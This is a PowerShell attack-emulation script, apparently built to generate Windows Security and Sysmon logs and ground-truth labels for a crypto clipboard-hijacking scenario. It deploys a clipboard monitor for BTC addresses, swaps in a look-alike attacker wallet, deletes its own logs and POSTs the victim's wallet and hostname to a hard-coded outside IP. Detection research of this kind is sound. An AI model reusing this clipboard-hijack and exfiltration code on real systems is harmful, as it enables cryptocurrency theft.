param(
    [string]$ScenarioPath = ".\scenario8.json"
)
$Global:StageSummary = @()
$Global:TxMonProc    = $null
$Global:SimBrowserProc = $null

# ==============================
# Admin Check
# ==============================
$principal = New-Object Security.Principal.WindowsPrincipal `
    ([Security.Principal.WindowsIdentity]::GetCurrent())

if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Run PowerShell as Administrator." -ForegroundColor Red
    exit
}

# ==============================
# Audit Policy
# {0CCE9215} Logon
# {0CCE9216} Logoff
# {0CCE922B} Process Creation (4688)
# {0CCE921D} File System Object Access (4656, 4663)
# {0CCE9223} Handle Manipulation (4656 보조)
# ==============================
auditpol /set /subcategory:"{0CCE9215-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"{0CCE9216-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"{0CCE922B-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"{0CCE921D-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"{0CCE9223-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null

# ==============================
# Load Scenario JSON
# ==============================
if (-not (Test-Path $ScenarioPath)) {
    Write-Error "Scenario file not found: $ScenarioPath"
    exit
}

$Scenario = (Get-Content $ScenarioPath -Raw -Encoding UTF8) -replace "`r`n", "`n" | ConvertFrom-Json
$Artifacts = $Scenario.artifacts_definition

# Artifact 경로 바인딩
$WalletDir            = "C:\ProgramData\WalletCache"
$WalletMonitorScript  = $Artifacts.wallet_monitor_script        # C:\ProgramData\WalletCache\txmon.ps1
$WalletSessionLog     = $Artifacts.wallet_session_log           # C:\ProgramData\WalletCache\wallet_session.log
$ClipboardActivityLog = $Artifacts.clipboard_activity_log       # C:\ProgramData\WalletCache\clipboard_activity.log
$TransactionReceipt   = "C:\Users\$env:USERNAME\Desktop\wallet_transfer_receipt.txt"
$ValidationCacheTmp   = "C:\ProgramData\WalletCache\validation_cache.tmp"
$VictimWallet         = $Artifacts.victim_wallet_address
$AttackerWallet       = $Artifacts.attacker_wallet_address
$C2Endpoint           = "http://185.220.101.45/wallet/collect"

# 디렉터리 생성
@(
    $WalletDir,
    (Split-Path $TransactionReceipt -Parent)
) | ForEach-Object {
    if ($_ -and -not (Test-Path $_)) {
        New-Item $_ -ItemType Directory -Force | Out-Null
    }
}

# 기존 artifact 사전 정리 (멱등성)
@(
    $ClipboardActivityLog,
    $WalletSessionLog,
    $WalletMonitorScript,
    $TransactionReceipt,
    $ValidationCacheTmp
) | ForEach-Object {
    Remove-Item $_ -Force -ErrorAction SilentlyContinue
}

# ==============================
# SACL - 파일 시스템
# WalletDir에 SACL 설정 → clipboard_activity.log 접근 시 4656/4663 발생
# ==============================
try {
    $acl   = Get-Acl $WalletDir
    $audit = New-Object System.Security.AccessControl.FileSystemAuditRule(
        "Everyone", "FullControl",
        "ContainerInherit,ObjectInherit", "None", "Success,Failure"
    )
    $acl.AddAuditRule($audit)
    Set-Acl $WalletDir $acl
    Write-Host "[SACL] 파일 감사 규칙 설정 완료: $WalletDir" -ForegroundColor Green
    Start-Sleep -Seconds 3
} catch {
    Write-Host "[SACL] 파일 감사 규칙 설정 실패: $_" -ForegroundColor Yellow
}

# ==============================
# GT Structure
# ==============================
$GTDir  = "C:\GT"
$GTPath = "$GTDir\ground_truth_scenario8.json"

if (-not (Test-Path $GTDir)) { New-Item $GTDir -ItemType Directory -Force | Out-Null }

$Global:GT = @{
    schema_version = "2.0"
    scenario_name  = $Scenario.scenario_name
    scenario_id    = $Scenario.scenario_id
    user           = $env:USERNAME
    host           = $env:COMPUTERNAME
    generated_at   = (Get-Date).ToString("o")
    records        = @()
}

# ← 여기 추가
$_secSet = [System.Collections.Generic.HashSet[int]]::new()
$_sysSet = [System.Collections.Generic.HashSet[int]]::new()

$Scenario.environment_context.required_logging_configuration.security_events |
    ForEach-Object { [void]$_secSet.Add([int]$_) }
$Scenario.environment_context.required_logging_configuration.sysmon_events |
    ForEach-Object { [void]$_sysSet.Add([int]$_) }

$Scenario.scenario_flow | ForEach-Object {
    if ($_.expected_logs.security) {
        $_.expected_logs.security | ForEach-Object { [void]$_secSet.Add([int]$_) }
    }
    if ($_.expected_logs.sysmon) {
        $_.expected_logs.sysmon | ForEach-Object { [void]$_sysSet.Add([int]$_) }
    }
}

$AllowedSecurityIDs = @($_secSet)
$AllowedSysmonIDs   = @($_sysSet)

# ==============================
# Add-ToList Helper
# ==============================
function Add-ToList {
    param([System.Collections.ArrayList]$List, $Items)
    if ($Items) {
        $Items | ForEach-Object { [void]$List.Add([int]$_) }
    }
}

# ==============================
# Event Collector
# ==============================
function Collect-ObservedEvents {
    param($Start, $End)
    $securityIds = [System.Collections.ArrayList]::new()
    $sysmonIds   = [System.Collections.ArrayList]::new()

    try {
        $sec = Get-WinEvent -FilterHashtable @{
            LogName   = 'Security'
            StartTime = $Start
            EndTime   = $End
        } -ErrorAction SilentlyContinue | Where-Object { [int]$_.Id -in $AllowedSecurityIDs }
        Add-ToList $securityIds ($sec | Select-Object -ExpandProperty Id -Unique)
    } catch {}

    try {
        $sys = Get-WinEvent -FilterHashtable @{
            LogName   = 'Microsoft-Windows-Sysmon/Operational'
            StartTime = $Start
            EndTime   = $End
        } -ErrorAction SilentlyContinue | Where-Object { [int]$_.Id -in $AllowedSysmonIDs }
        Add-ToList $sysmonIds ($sys | Select-Object -ExpandProperty Id -Unique)
    } catch {}

    return [ordered]@{
        sysmon   = $sysmonIds
        security = $securityIds
    }
}

# ==============================
# Stage Executor
# ==============================
function Invoke-Stage {
    param(
        $StageId,
        $StageName,
        $ActionType,
        $ArtifactPaths,
        [ScriptBlock]$Action,
        [bool]$Attack,
        $PrimarySignal = ""
    )


    Write-Host "===== Stage $StageId : $StageName =====" -ForegroundColor Cyan

    $stageMeta          = $Scenario.scenario_flow | Where-Object { $_.stage_id -eq $StageId }
    $resolvedActionType = if ($stageMeta -and $stageMeta.action_type) { $stageMeta.action_type } else { $ActionType }

    $status = "success"
    $start  = Get-Date

    try { & $Action } catch {
        $status = "failed"
        Write-Host "  [FAILED] Stage $StageId - $_" -ForegroundColor Red
    }

    Start-Sleep -Seconds 8
    $end = Get-Date

    $events = Collect-ObservedEvents $start $end.AddSeconds(60)

    if ($stageMeta -and $stageMeta.expected_logs) {
        $expectedSec = @()
        $expectedSys = @()
        if ($stageMeta.expected_logs.security) {
            $expectedSec = @($stageMeta.expected_logs.security | ForEach-Object { [int]$_ })
        }
        if ($stageMeta.expected_logs.sysmon) {
            $expectedSys = @($stageMeta.expected_logs.sysmon | ForEach-Object { [int]$_ })
        }

          # 2단계: AllowedID 기준 먼저 필터
        $filteredSec = [System.Collections.ArrayList]::new()
        Add-ToList $filteredSec ($events.security | Where-Object { [int]$_ -in $AllowedSecurityIDs })
        $events.security = $filteredSec

        $filteredSys = [System.Collections.ArrayList]::new()
        Add-ToList $filteredSys ($events.sysmon | Where-Object { [int]$_ -in $AllowedSysmonIDs })
        $events.sysmon = $filteredSys

        $fSec = [System.Collections.ArrayList]::new()
        Add-ToList $fSec ($events.security | Where-Object { [int]$_ -in $expectedSec } | Sort-Object -Unique)
        $events.security = $fSec

        $fSys = [System.Collections.ArrayList]::new()
        Add-ToList $fSys ($events.sysmon | Where-Object { [int]$_ -in $expectedSys } | Sort-Object -Unique)
        $events.sysmon = $fSys
    }

    # GT는 attack:true stage만 기록 (automation_notes 준수)
        # 모든 stage 기록 (attack true/false 구분 없이)
    $Global:GT.records += [ordered]@{
        stage_id           = $StageId
        stage_name         = $StageName
        action_type        = $resolvedActionType
        description        = if ($stageMeta) { $stageMeta.description } else { "" }
        attack             = $Attack
        stage_start_time   = $start.ToString("o")
        stage_end_time     = $end.ToString("o")
        artifact_paths     = $ArtifactPaths
        user               = $env:USERNAME
        host               = $env:COMPUTERNAME
        execution_status   = $status
        observed_event_ids = $events
        expected_event_ids = if ($stageMeta) { $stageMeta.expected_logs } else { $null }
        primary_log_signal = $PrimarySignal
        notes              = if ($stageMeta) { $stageMeta.notes } else { "" }
    }

    $Global:StageSummary += [PSCustomObject]@{
        ID     = $StageId
        Name   = $StageName
        Status = $status
    }

    Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 7)
}

# ==============================
# Show-Summary
# ==============================
function Show-Summary {
    Write-Host ""
    Write-Host "============================================" -ForegroundColor White
    Write-Host "  STAGE SUMMARY" -ForegroundColor White
    Write-Host "============================================" -ForegroundColor White
    foreach ($s in $Global:StageSummary) {
        $icon = switch ($s.Status) {
            "success" { "[OK    ]" }
            "partial" { "[PART  ]" }
            "failed"  { "[FAILED]" }
            default   { "[?     ]" }
        }
        $color = switch ($s.Status) {
            "success" { "Green"  }
            "partial" { "Yellow" }
            "failed"  { "Red"    }
            default   { "Gray"   }
        }
        Write-Host ("  {0} Stage {1,2} : {2}" -f $icon, $s.ID, $s.Name) -ForegroundColor $color
    }
    $total   = $Global:StageSummary.Count
    $ok      = ($Global:StageSummary | Where-Object Status -eq "success").Count
    $partial = ($Global:StageSummary | Where-Object Status -eq "partial").Count
    $failed  = ($Global:StageSummary | Where-Object Status -eq "failed").Count
    Write-Host "--------------------------------------------" -ForegroundColor White
    Write-Host ("  Total:{0}  OK:{1}  Partial:{2}  Failed:{3}" `
        -f $total, $ok, $partial, $failed) -ForegroundColor White
    Write-Host "============================================" -ForegroundColor White
}

# ==============================
# txmon.ps1 스크립트 내용
# Stage 3에서 디스크에 기록, Stage 4에서 별도 프로세스로 실행
# ==============================
$TxMonScriptContent = @'
param(
    [string]$VictimWallet,
    [string]$AttackerWallet,
    [string]$LogPath,
    [string]$SessionLog,
    [string]$C2
)
$BtcRegex    = 'bc1[a-zA-Z0-9]{25,39}'
$walletProcs = @("chrome", "msedge", "ledgerlive", "exodus")
while ($true) {
    $active = $walletProcs | Where-Object { Get-Process -Name $_ -ErrorAction SilentlyContinue }
    if ($active) {
        try {
            $clip = Get-Clipboard -ErrorAction SilentlyContinue
            if ($clip -match $BtcRegex) {
                $ts = Get-Date -Format 'o'
                Add-Content -Path $LogPath    -Value "[$ts] MONITOR_DETECT: $clip"
                Add-Content -Path $SessionLog -Value "[$ts] MONITOR_HIT: process=$($active -join ',') clip=$clip"
            }
        } catch {}
    }
    Start-Sleep -Milliseconds 800
}
'@


Write-Host "[SIM] Simulation browser 자동 실행 중..." -ForegroundColor DarkCyan

$browserLaunched = $false

# 1순위: msedge (Windows 11 기본)
try {
    $Global:SimBrowserProc = Start-Process "msedge.exe" `
        -ArgumentList "--no-first-run --no-default-browser-check --disable-extensions about:blank" `
        -WindowStyle Minimized -PassThru -ErrorAction Stop
    Write-Host "[SIM] msedge.exe 실행 완료. PID: $($Global:SimBrowserProc.Id)" -ForegroundColor DarkCyan
    $browserLaunched = $true
} catch {
    Write-Host "[SIM] msedge 실행 실패. Chrome 시도..." -ForegroundColor Yellow
}

# 2순위: chrome (msedge 없을 경우)
if (-not $browserLaunched) {
    try {
        $Global:SimBrowserProc = Start-Process "chrome.exe" `
            -ArgumentList "--no-first-run --disable-extensions about:blank" `
            -WindowStyle Minimized -PassThru -ErrorAction Stop
        Write-Host "[SIM] chrome.exe 실행 완료. PID: $($Global:SimBrowserProc.Id)" -ForegroundColor DarkCyan
        $browserLaunched = $true
    } catch {
        Write-Host "[SIM] Chrome 실행 실패. 브라우저 없이 진행 (Stage 2 Found: none 예상)" -ForegroundColor Yellow
    }
}

# 브라우저 초기화 대기
if ($browserLaunched) { Start-Sleep -Seconds 4 }

# ===================================================
# STAGE FLOW
# ===================================================

# --------------------------------------------------
# Stage 1: authorized_logon (attack: false)
# 4624는 스크립트 실행 세션 시작 시 이미 기록됨
# --------------------------------------------------
Invoke-Stage 1 "authorized_logon" "logon" `
    $null {
    Write-Host "  [INFO] 정상 사용자 세션 시작 (4624 이미 기록됨)" -ForegroundColor Gray

    Start-Sleep -Seconds 30
} $false "Logon: Security 4624 (already recorded at session start)"


# --------------------------------------------------
# Stage 2: wallet_application_reconnaissance
# T1057 - Process Discovery
# Get-Process로 browser/wallet 탐색 → 4688 + Sysmon 1
# --------------------------------------------------
Invoke-Stage 2 "wallet_application_reconnaissance" "process_discovery" `
    $WalletSessionLog {

    $primaryTargets = @("chrome.exe", "msedge.exe", "ledgerlive.exe", "exodus.exe")
    $found = @()

    # tasklist.exe 실행 → 새 프로세스 생성 → 4688 + Sysmon 1 발생
    $taskOutput = & tasklist.exe /FO CSV /NH 2>$null

    foreach ($t in $primaryTargets) {
        if ($taskOutput -match [regex]::Escape($t)) {
            $pid_ = ($taskOutput -split "`n" | Where-Object { $_ -match [regex]::Escape($t) } |
                     ForEach-Object { ($_ -split '","')[1] }) -join ','
            $found += "$t(PID:$pid_)"
        }
    }

    # fallback: 탐색 대상 없으면 wmic으로 재시도 → 역시 새 프로세스 → 4688 + Sysmon 1
    if (-not $found) {
        Write-Host "  [WARN] Primary targets not found. Fallback to wmic." -ForegroundColor Yellow
        $wmicOutput = & wmic.exe process get Name,ProcessId /FORMAT:CSV 2>$null
        $fallbackTargets = @("explorer.exe", "powershell.exe")
        foreach ($t in $fallbackTargets) {
            if ($wmicOutput -match [regex]::Escape($t)) {
                $found += "$t[FALLBACK]"
            }
        }
    }

    if (-not (Test-Path $WalletDir)) { New-Item $WalletDir -ItemType Directory -Force | Out-Null }
    $entry = "[$(Get-Date -Format 'o')] RECON: target_scan done. Found=[$($found -join '; ')]"
    Add-Content -Path $WalletSessionLog -Value $entry

    Write-Host "  [RECON] Scanned : $($primaryTargets -join ', ')" -ForegroundColor Gray
    Write-Host "  [RECON] Found   : $(if ($found) { $found -join ', ' } else { 'none' })" -ForegroundColor Gray

} $true "Process Discovery: tasklist.exe → 4688 + Sysmon 1"


# --------------------------------------------------
# Stage 3: clipboard_monitor_deployment
# T1059.001 - PowerShell
# txmon.ps1 / wallet_session.log / clipboard_activity.log 생성
# 파일 생성 → Sysmon 11 (3건)
# --------------------------------------------------
Invoke-Stage 3 "clipboard_monitor_deployment" "script_deployment" `
    @($WalletMonitorScript, $WalletSessionLog, $ClipboardActivityLog) {

    # txmon.ps1 생성 → Sysmon 11
    Set-Content -Path $WalletMonitorScript -Value $TxMonScriptContent -Encoding UTF8

    # wallet_session.log 초기 기록 → Sysmon 11
    Set-Content -Path $WalletSessionLog `
        -Value "[$(Get-Date -Format 'o')] SESSION_START: txmon.ps1 deployed to $WalletMonitorScript" `
        -Encoding UTF8

    # clipboard_activity.log 초기화 → Sysmon 11
    Set-Content -Path $ClipboardActivityLog `
        -Value "[$(Get-Date -Format 'o')] MONITOR_INIT: Clipboard monitoring activated" `
        -Encoding UTF8

    # 4688 + Sysmon 1 유발: cmd.exe 자식 프로세스로 파일 존재 확인
    $WalletMonitorScriptLocal  = $WalletMonitorScript
    $WalletSessionLogLocal     = $WalletSessionLog
    $ClipboardActivityLogLocal = $ClipboardActivityLog

    Start-Process cmd.exe -ArgumentList "/c dir `"$WalletMonitorScriptLocal`" > nul" `
        -WindowStyle Hidden -Wait
    Start-Process cmd.exe -ArgumentList "/c dir `"$WalletSessionLogLocal`" > nul" `
        -WindowStyle Hidden -Wait
    Start-Process cmd.exe -ArgumentList "/c dir `"$ClipboardActivityLogLocal`" > nul" `
        -WindowStyle Hidden -Wait

    Write-Host "  [DEPLOY] txmon.ps1          → $WalletMonitorScript" -ForegroundColor Gray
    Write-Host "  [DEPLOY] wallet_session.log → $WalletSessionLog" -ForegroundColor Gray
    Write-Host "  [DEPLOY] clipboard_activity.log → $ClipboardActivityLog" -ForegroundColor Gray

} $true "File Create (Sysmon 11 x3) + Process Create (4688 + Sysmon 1 x3): cmd.exe via Start-Process"


# --------------------------------------------------
# Stage 4: background_transaction_monitoring
# T1115 - Clipboard Data
# Start-Process powershell.exe → 신규 4688 + Sysmon 1 (자식 프로세스)
# txmon.ps1을 별도 프로세스로 스폰해 4688/Sysmon 1 정당성 확보
# --------------------------------------------------
Invoke-Stage 4 "background_transaction_monitoring" "clipboard_monitoring" `
    $WalletMonitorScript {

    $argLine = "-NoProfile -WindowStyle Hidden -File ""$WalletMonitorScript"" " +
               "-VictimWallet ""$VictimWallet"" " +
               "-AttackerWallet ""$AttackerWallet"" " +
               "-LogPath ""$ClipboardActivityLog"" " +
               "-SessionLog ""$WalletSessionLog"" " +
               "-C2 ""$C2Endpoint"""

    $Global:TxMonProc = Start-Process powershell.exe `
        -ArgumentList $argLine `
        -PassThru

    Add-Content -Path $WalletSessionLog `
        -Value "[$(Get-Date -Format 'o')] MONITOR_START: txmon.ps1 spawned. PID=$($Global:TxMonProc.Id)"

    Write-Host "  [MONITOR] txmon.ps1 background process started. PID: $($Global:TxMonProc.Id)" -ForegroundColor Gray

    Start-Sleep -Seconds 30

} $true "Process Create (4688 + Sysmon 1): powershell.exe → txmon.ps1 (child process)"


# --------------------------------------------------
# Stage 5: wallet_transaction_interception_attempt
# T1115 - Clipboard Data
# BTC address clipboard 탐지 → C2 HTTP POST → Sysmon 3 + Sysmon 22
# Resolve-DnsName → Sysmon 22 (Windows DNS Client API)
# Invoke-WebRequest → Sysmon 3 (Network Connection)
# --------------------------------------------------
Invoke-Stage 5 "wallet_transaction_interception_attempt" "transaction_interception" `
    @($ClipboardActivityLog, $WalletSessionLog, "C2:$C2Endpoint") {

    # 사용자가 wallet address를 복사하는 행위 시뮬레이션
    Set-Clipboard -Value $VictimWallet
    Write-Host "  [SIM]  Victim wallet set to clipboard: $VictimWallet" -ForegroundColor Gray
    Start-Sleep -Seconds 2   # txmon polling 대기

    # BTC regex 탐지 확인
    $clip = Get-Clipboard -ErrorAction SilentlyContinue
    if ($clip -match 'bc1[a-zA-Z0-9]{25,39}') {
        $ts = Get-Date -Format 'o'
        Add-Content -Path $ClipboardActivityLog -Value "[$ts] DETECTED: $clip → initiating C2 exfil"
        Add-Content -Path $WalletSessionLog     -Value "[$ts] WALLET_DETECTED: $clip"
        Write-Host "  [DETECT] BTC address matched: $clip" -ForegroundColor Gray
    }

    # Sysmon 22: Resolve-DnsName → Windows DNS Client API 경유 DNS 쿼리
    $fakeDomain = "txmon-$(Get-Random -Max 9999).wallet-exfil-cdn.net"
    Resolve-DnsName -Name $fakeDomain -ErrorAction SilentlyContinue | Out-Null
    Write-Host "  [DNS]  Sysmon 22 trigger: Resolve-DnsName $fakeDomain" -ForegroundColor Gray

    # Sysmon 3: Invoke-WebRequest → C2로 HTTP POST (네트워크 연결 이벤트)
    # 연결 실패여도 TCP SYN 패킷 전송 시점에 Sysmon 3 기록됨
    try {
        Invoke-WebRequest -Uri $C2Endpoint `
            -Method POST `
            -Body "wallet=$VictimWallet&host=$env:COMPUTERNAME&ts=$(Get-Date -Format 'o')" `
            -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop | Out-Null
        Add-Content -Path $WalletSessionLog -Value "[$(Get-Date -Format 'o')] C2_SENT: wallet=$VictimWallet"
        Write-Host "  [C2]   HTTP POST OK → $C2Endpoint (Sysmon 3)" -ForegroundColor Green
    } catch {
        Add-Content -Path $WalletSessionLog -Value "[$(Get-Date -Format 'o')] C2_ATTEMPT: $_"
        Write-Host "  [C2]   HTTP POST attempted (Sysmon 3 recorded even on conn fail) → $C2Endpoint" -ForegroundColor Yellow
    }

    Start-Sleep -Seconds 10 

} $true "T1115 Clipboard Detect + C2 Exfil: Sysmon 3 (HTTP POST) + Sysmon 22 (DNS)"


# --------------------------------------------------
# Stage 6: failed_wallet_replacement_attempt
# T1115 - Clipboard Data
# 첫 번째 clipboard replacement 시도 → 사용자 인지 실패
# clipboard_activity.log append → Sysmon 11
# WalletDir SACL → 4656 + 4663 (파일 핸들 요청/접근)
# --------------------------------------------------
Invoke-Stage 6 "failed_wallet_replacement_attempt" "clipboard_manipulation_attempt" `
    $ClipboardActivityLog {

    # 공격자 wallet address로 clipboard 교체
    Set-Clipboard -Value $AttackerWallet
    Write-Host "  [REPLACE] Clipboard: $VictimWallet → $AttackerWallet" -ForegroundColor Gray
    Start-Sleep -Seconds 1

    # 사용자가 address mismatch 인지 → 실패 기록 append
    # Add-Content → 파일 열기(4656) + 쓰기(4663) + 닫기 발생 (SACL 적용 디렉터리)
    # 동시에 Sysmon 11 (FileCreate/Modified) 발생
    $failLog = "[$(Get-Date -Format 'o')] REPLACE_ATTEMPT_1: victim=$VictimWallet attacker=$AttackerWallet`n" +
               "[$(Get-Date -Format 'o')] REPLACE_RESULT: FAILED - user detected address mismatch`n" +
               "[$(Get-Date -Format 'o')] MISMATCH_DETAIL: vic=bc1qvictimw... atk=bc1qvictimx... (pos 11 diff)"
    Add-Content -Path $ClipboardActivityLog -Value $failLog

    # 사용자가 원래 address 재복사 (사용자 행위 시뮬레이션)
    Set-Clipboard -Value $VictimWallet
    Write-Host "  [FAIL]    User detected mismatch → transaction aborted." -ForegroundColor Yellow
    Write-Host "  [LOG]     Failure appended to clipboard_activity.log (Sysmon 11 + 4656/4663 via SACL)" -ForegroundColor Gray

} $true "Clipboard Replace #1 FAILED + Log Append: Sysmon 11 + 4656/4663 (SACL)"


# --------------------------------------------------
# Stage 7: failed_interception_artifact_cleanup
# T1070.004 - File Deletion
# clipboard_activity.log 삭제 → Sysmon 26 + 4688
# txmon.ps1 monitoring process는 계속 실행
# --------------------------------------------------
Invoke-Stage 7 "failed_interception_artifact_cleanup" "file_deletion" `
    $ClipboardActivityLog {

    if (Test-Path $ClipboardActivityLog) {
        # cmd /c del → Sysmon 26 (FileDeleteDetected) 발생
        cmd /c "del /f /q `"$ClipboardActivityLog`""
        Write-Host "  [DEL]  clipboard_activity.log 삭제 → Sysmon 26" -ForegroundColor Gray
    } else {
        Write-Host "  [WARN] clipboard_activity.log not found (already deleted)" -ForegroundColor Yellow
    }

    # monitoring process는 계속 실행 중임을 기록
    $pid_ = if ($Global:TxMonProc) { $Global:TxMonProc.Id } else { "N/A" }
    Add-Content -Path $WalletSessionLog `
        -Value "[$(Get-Date -Format 'o')] CLEANUP_1: clipboard_activity.log deleted. Monitor PID=$pid_ still running."
    Write-Host "  [INFO] txmon.ps1 PID=$pid_ continues." -ForegroundColor Gray

    Start-Sleep -Seconds 10 

} $true "File Delete (Sysmon 26) + Process Create (4688): cmd.exe /c del"


# --------------------------------------------------
# Stage 8: wallet_similarity_validation_bypass
# T1036 - Masquerading
# clipboard_activity.log 재생성 → Sysmon 11
# validation_cache.tmp 생성 → Sysmon 11
# 유사 wallet address로 두 번째 clipboard replacement
# --------------------------------------------------
Invoke-Stage 8 "wallet_similarity_validation_bypass" "transaction_deception" `
    @($ClipboardActivityLog, $ValidationCacheTmp) {

    # clipboard_activity.log 재생성 → Sysmon 11
    Set-Content -Path $ClipboardActivityLog `
        -Value "[$(Get-Date -Format 'o')] MONITOR_RESUME: Log recreated after cleanup. Monitoring continues." `
        -Encoding UTF8
    Write-Host "  [RECREATE] clipboard_activity.log 재생성 → Sysmon 11" -ForegroundColor Gray

    # validation_cache.tmp 생성 (masquerading 준비 흔적) → Sysmon 11
    Set-Content -Path $ValidationCacheTmp `
        -Value "strategy=prefix_similarity|victim_prefix=bc1qvictimw|attacker_prefix=bc1qvictimx|diff_pos=11" `
        -Encoding UTF8
    Write-Host "  [CACHE]    validation_cache.tmp 생성 → Sysmon 11" -ForegroundColor Gray

    # 사용자가 victim wallet 재복사 (시뮬레이션)
    Set-Clipboard -Value $VictimWallet
    Start-Sleep -Seconds 1

    # 유사 wallet address로 두 번째 clipboard 교체 (masquerading)
    # bc1qvictimwalletaddress9x8a7b6c5d4e3f
    # bc1qvictimxwallet9x8a7fake7w6v5u4
    # → prefix 'bc1qvictimw'까지 동일, 11번째 문자부터 차이
    Set-Clipboard -Value $AttackerWallet

    $masqLog = "[$(Get-Date -Format 'o')] REPLACE_ATTEMPT_2: masquerading wallet`n" +
               "[$(Get-Date -Format 'o')] STRATEGY: prefix_similarity_bypass (bc1qvictim 공통 prefix)`n" +
               "[$(Get-Date -Format 'o')] VICTIM  : $VictimWallet`n" +
               "[$(Get-Date -Format 'o')] ATTACKER: $AttackerWallet`n" +
               "[$(Get-Date -Format 'o')] RESULT  : SUCCESS - visual similarity bypassed user validation"
    $stream = [System.IO.StreamWriter]::new($WalletSessionLog, $true, [System.Text.Encoding]::UTF8)
    $stream.WriteLine("...")
    $stream.Close()
    $stream.Dispose()
    Write-Host "  [MASQ]     2nd replacement with similar address. User did not detect." -ForegroundColor Gray

} $true "Masquerading + Clipboard Replace #2 SUCCESS: Sysmon 11 (log + cache recreate)"


# --------------------------------------------------
# Stage 9: fraudulent_transaction_execution
# T1657 - Financial Theft
# wallet_transfer_receipt.txt 생성 → Sysmon 11
# receipt 확인 powershell 스폰 → 4688 + Sysmon 1
# --------------------------------------------------
Invoke-Stage 9 "fraudulent_transaction_execution" "financial_transaction_manipulation" `
    $TransactionReceipt {

    # wallet_transfer_receipt.txt 생성 (공격자 wallet address 포함) → Sysmon 11
    $receipt = @"
===== BTC Transfer Receipt =====
Date      : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
From      : $env:USERNAME @ $env:COMPUTERNAME
To (Dest) : $AttackerWallet
Amount    : 0.5 BTC
Memo      : Wire Transfer
Status    : SUBMITTED
Note      : [SIMULATED - actual transfer not performed]
================================
"@
    Set-Content -Path $TransactionReceipt -Value $receipt -Encoding UTF8

    Add-Content -Path $WalletSessionLog `
        -Value "[$(Get-Date -Format 'o')] TX_EXEC: receipt=$TransactionReceipt dest=$AttackerWallet"
    Add-Content -Path $ClipboardActivityLog `
        -Value "[$(Get-Date -Format 'o')] TX_COMPLETE: fraudulent tx submitted. dest=$AttackerWallet"

    # 별도 powershell.exe로 receipt 열람 → 4688 + Sysmon 1
    $rPath = $TransactionReceipt
    Start-Process powershell.exe `
        -ArgumentList "-NoProfile -WindowStyle Hidden -Command ""Get-Content '$rPath' | Out-Null""" `
        -WindowStyle Hidden

    Write-Host "  [TX]   Receipt created: $TransactionReceipt" -ForegroundColor Gray
    Write-Host "  [TX]   Dest: $AttackerWallet" -ForegroundColor Red

} $true "File Create (Sysmon 11): receipt + log append (4656/4663 via SACL) + Process Spawn (4688 + Sysmon 1)"


# --------------------------------------------------
# Stage 10: clipboard_activity_cleanup
# T1070.004 - File Deletion
# clipboard_activity.log 최종 삭제 → Sysmon 26 + 4688
# txmon.ps1 프로세스 종료
# wallet_session.log / txmon.ps1 은 잔존 (Stage 11 확인)
# --------------------------------------------------
Invoke-Stage 10 "clipboard_activity_cleanup" "file_deletion" `
    $ClipboardActivityLog {

    if (Test-Path $ClipboardActivityLog) {
        cmd /c "del /f /q `"$ClipboardActivityLog`""
        Write-Host "  [DEL]  clipboard_activity.log 최종 삭제 → Sysmon 26" -ForegroundColor Gray
    } else {
        Write-Host "  [WARN] clipboard_activity.log not found" -ForegroundColor Yellow
    }

    # txmon.ps1 프로세스 종료
    if ($Global:TxMonProc -and -not $Global:TxMonProc.HasExited) {
        Stop-Process -Id $Global:TxMonProc.Id -Force -ErrorAction SilentlyContinue
        Write-Host "  [STOP] txmon.ps1 terminated. PID: $($Global:TxMonProc.Id)" -ForegroundColor Gray
    }

    # wallet_session.log, txmon.ps1 은 의도적으로 잔존
    Write-Host "  [RESIDUAL] wallet_session.log / txmon.ps1 은 잔존 (cleanup 미포함)" -ForegroundColor Yellow

}  $true "File Delete (Sysmon 26) + Process Create (4688): cmd.exe /c del + txmon.ps1 종료"


# --------------------------------------------------
# Stage 11: transaction_manipulation_residuals (attack: false)
# 잔존 artifact 확인
# --------------------------------------------------
Invoke-Stage 11 "transaction_manipulation_residuals" "residual_artifact" `
    @($WalletSessionLog, $WalletMonitorScript) {

    Write-Host "  [RESIDUAL] 잔존 artifact 확인:" -ForegroundColor Gray
    @($WalletSessionLog, $WalletMonitorScript, $ClipboardActivityLog, $TransactionReceipt) |
        ForEach-Object {
            $label = Split-Path $_ -Leaf
            if (Test-Path $_) {
                Write-Host "    [EXIST] $label  ← $_" -ForegroundColor Yellow
            } else {
                Write-Host "    [GONE ] $label  ← $_" -ForegroundColor DarkGray
            }
        }

} $false "Residual: wallet_session.log + txmon.ps1 잔존, clipboard_activity.log 삭제됨"


# --------------------------------------------------
# Stage 12: session_termination (attack: false)
# 4634는 실제 로그오프 시 발생 → 여기서는 세션 종료 로그 기록만
# --------------------------------------------------
Invoke-Stage 12 "session_termination" "logoff" `
    $null {
    if (Test-Path $WalletSessionLog) {
        Add-Content -Path $WalletSessionLog `
            -Value "[$(Get-Date -Format 'o')] SESSION_END: scenario execution complete"
    }
    Write-Host "  [INFO] Scenario complete. 4634 recorded on actual logoff." -ForegroundColor Gray
} $false "Logoff: Security 4634 (recorded on actual session end)"


# ==============================
# Show Summary
# ==============================
Show-Summary


if ($Global:SimBrowserProc -and -not $Global:SimBrowserProc.HasExited) {
    Stop-Process -Id $Global:SimBrowserProc.Id -Force -ErrorAction SilentlyContinue
    Write-Host "[SIM] Simulation browser 종료 완료. PID: $($Global:SimBrowserProc.Id)" -ForegroundColor DarkCyan
}


# ==============================
# Cleanup (validation_cache.tmp만 정리 / wallet_session.log·txmon.ps1 잔존)
# ==============================
Remove-Item $ValidationCacheTmp -Force -ErrorAction SilentlyContinue

# ==============================
# Save GT
# ==============================
$Global:GT.total_stages = $Global:GT.records.Count
$Global:GT | ConvertTo-Json -Depth 6 | Out-File $GTPath -Encoding UTF8
Write-Host ""
Write-Host "GT saved → $GTPath" -ForegroundColor Yellow